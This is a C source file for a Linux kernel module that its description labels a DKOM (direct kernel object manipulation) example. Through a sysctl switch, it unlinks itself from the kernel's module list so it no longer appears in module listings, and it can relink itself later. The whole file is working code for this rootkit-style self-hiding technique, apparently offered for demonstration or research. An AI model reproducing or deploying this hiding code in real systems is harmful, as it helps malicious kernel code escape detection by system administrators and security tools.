#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/version.h>

#define debug(fmt...)			\
	pr_info("[" KBUILD_MODNAME "] " fmt)

/*
 * Find kernel/module.c "static LIST_HEAD(modules)" symbol
 */

struct list_head * p_modules = NULL;

struct list_head * get_modules_head(void)
{
	struct list_head * pos;

	while(!mutex_trylock(&module_mutex))
		cpu_relax();

	list_for_each(pos, &THIS_MODULE->list) {
		if ((unsigned long)pos < MODULES_VADDR) {
			break;
		}
	}

	mutex_unlock(&module_mutex);

	if (pos) {
		debug("Found \"modules\" head @ %pK\n", pos);
	} else {
		debug("Can't find \"modules\" head, aborting\n");
	}

	return pos;
}

static void hide_or_show(int new)
{
	while(!mutex_trylock(&module_mutex))
		cpu_relax();

	if (new == 1) {
		/* 0 -> 1 : hide */

		list_del(&THIS_MODULE->list);

		debug("Module \"%s\" unlinked\n", THIS_MODULE->name);

	} else {
		/* 1 -> 0 : show */

		list_add(&THIS_MODULE->list, p_modules);

		debug("Module \"%s\" linked again\n", THIS_MODULE->name);
	}

	mutex_unlock(&module_mutex);
}

/*
 * Sysctl state change stuff
 */

static int state = 0, state_min = 0, state_max = 1;

static int state_change(struct ctl_table * table,			\
			int write, void __user * buffer, size_t * lenp, loff_t * ppos)
{
	int result, old, new;

	old = *(int *)table->data;
	result = proc_dointvec_minmax(table, write, buffer, lenp, ppos);
	new = *(int *)table->data;

	if (!result && (new != old)) {
		hide_or_show(new);
	}

	return result;
}

static ctl_table table[] = {
	{
		.procname = KBUILD_MODNAME,
		.mode = 0644,
		.data = &state,
		.maxlen = sizeof(state),
		.extra1 = &state_min, .extra2 = &state_max,
		.proc_handler = &state_change,
	},
	{ 0 }
};

static struct ctl_table_header * header;

int init_module(void)
{
	p_modules = get_modules_head();
	if (!p_modules)
		return -EINVAL;

	header = register_sysctl_table(table);
	if (!header)
		return -ENOMEM;

	debug("initialized\n");

	return 0;
}

void cleanup_module(void)
{
	unregister_sysctl_table(header);

	debug("deinitialized\n");
}

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Linux kernel modules DKOM example");
MODULE_AUTHOR("Ilya V. Matveychikov <i.matveychikov@milabs.ru>");
